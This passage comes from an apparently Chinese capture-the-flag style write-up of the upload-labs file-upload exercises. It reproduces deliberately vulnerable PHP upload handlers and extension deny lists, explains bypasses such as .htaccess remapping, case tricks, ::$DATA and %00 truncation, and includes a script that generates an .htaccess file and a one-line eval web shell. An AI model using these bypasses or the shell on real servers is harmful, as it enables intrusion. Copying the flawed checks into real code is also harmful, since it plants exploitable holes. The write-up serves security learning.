(isset($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/jpeg'</span>) <span class="params">||</span> ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/png'</span>) <span class="params">||</span> ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/gif'</span>)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'文件类型不正确，请重新上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH.<span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h2><p>上传了PHP，弹窗说asp、php等被过滤，就判断是特判了，将php改成了php5。<br>不允许上传.asp,.aspx,.php,.jsp后缀文件，但是可以上传其他任意后缀。比如说:.phtml .phps .php5 .pht，但如果上传的是.php5这种类型文件的话，如果想要被当成php执行的话，需要有个前提条件，即Apache的httpd.conf有如下配置代码</p><p><code>AddType application/x-httpd-php .php .phtml .phps .php5 .pht</code></p><p>AddType 指令：在给定的文件扩展名与特定的内容类型之间建立映射</p><p>但是03，没有过滤htaccess,所以可以直接上传htaccess，将jpg后缀解析为php文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">'.asp'</span>,<span class="string">'.aspx'</span>,<span class="string">'.php'</span>,<span class="string">'.jsp'</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'不允许上传.asp,.aspx,.php,.jsp后缀文件！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><p>过滤了好多好多好多好多后缀。。但是唯独没有过滤htaccess。。。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">"php1"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">"pHp1"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传!'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em><strong>之前收藏了生成htaccess以及木马的脚本。</strong></em></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">SIZE_HEADER = b<span class="string">"\n\n#define width 1337\n#define height 1337\n\n"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def generate_php_file(filename, script):</span><br><span class="line">    phpfile = <span class="built_in">open</span>(filename, <span class="string">'wb'</span>)</span><br><span class="line"></span><br><span class="line">    phpfile.<span class="built_in">write</span>(script.encode(<span class="string">'utf-16be'</span>))</span><br><span class="line">    phpfile.<span class="built_in">write</span>(SIZE_HEADER)</span><br><span class="line"></span><br><span class="line">    phpfile.<span class="built_in">close</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def generate_htacess():</span><br><span class="line">    htaccess = <span class="built_in">open</span>(<span class="string">'.htaccess'</span>, <span class="string">'wb'</span>)</span><br><span class="line"></span><br><span class="line">    htaccess.<span class="built_in">write</span>(SIZE_HEADER)</span><br><span class="line">    htaccess.<span class="built_in">write</span>(b<span class="string">'AddType application/x-httpd-php .lethe\n'</span>) <span class="comment"># 将.lethe后缀的文件作为php解析</span></span><br><span class="line">    htaccess.<span class="built_in">write</span>(b<span class="string">'php_value zend.multibyte 1\n'</span>)</span><br><span class="line">    htaccess.<span class="built_in">write</span>(b<span class="string">'php_value zend.detect_unicode 1\n'</span>)</span><br><span class="line">    htaccess.<span class="built_in">write</span>(b<span class="string">'php_value display_errors 1\n'</span>)</span><br><span class="line"></span><br><span class="line">    htaccess.<span class="built_in">close</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">generate_htacess()</span><br><span class="line"></span><br><span class="line">generate_php_file(<span class="string">"shell.lethe"</span>, <span class="string">"&lt;?php eval(@$_POST['a']); ?&gt;"</span>)</span><br></pre></td></tr></table></figure><p><img src="/3.jpg"></p><h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第五关虽然多了个htaccess，但是明显发现比上次的少了PHP后缀的大小写~</p><p><img src="/4.jpg"></p><h2 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h2><p>和上面代码一样，但是少了一行</p><p><code>$file_ext = trim($file_ext); //首尾去空</code><br>可以通过再php后面加空格来绕过！</p><p><img src="/5.jpg"></p><p><img src="/6.jpg"></p><h2 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h2><p>和上面代码一样但是少了一行</p><p><code>$file_name = deldot($file_name);//删除文件名末尾的点</code></p><p>可以在末尾加.来绕过！</p><p><img src="/7.jpg"></p><h2 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h2><p>少了这一句</p><p><code>$file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA</code></p><p>必须是windows, 必须是php, 必须是那个源文件<br>php在window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名<br>他的目的就是不检查后缀名….</p><p>也就是说当文件名为” XX.php.::$DATA “,就可以绕过后缀检测</p><p><img src="/8.jpg"></p><p>应该是windows特性，会被默认为文件流处理，但是由于靶机是linux,所以$DATA会被保留。</p><h2 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h2><p>这题源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>是比较完整的源码。看他源码，先是删除末尾的点，再进行末尾去空格。但是如果后缀还有个点的话，当服务器为windows的话会被删除，变成php文件进行解析。只限windows服务器。</p><p><img src="/9.jpg"></p><h2 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"pht"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = str_ireplace($deny_ext,<span class="string">""</span>, $file_name);</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;        </span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>trim — 去除字符串首尾处的空白字符（或者其他字符），<br>所以双写即可绕过。</p><p><img src="/10.jpg"></p><h2 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到路径通过get的save_path拼接，后面利用move_uploaded_file函数，可以利用%00截断后面的内容来上传。</p><p><code>$img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</code></p><p><img src="/11.jpg"></p><p>原理是利用C语言的终止符特性，当C语言在执行过程中遇到%00会被当成终止符，因此程序会自动截断后续信息。</p><p>但是由于PHP环境是7.2的，所以不能实现上传</p><p>条件：<br><br>php版本小于5.3.x，并且php.ini的magic_quotes_gpc要关闭。</p><h2 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_POST[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传失败"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">    &#125;</span><br><span 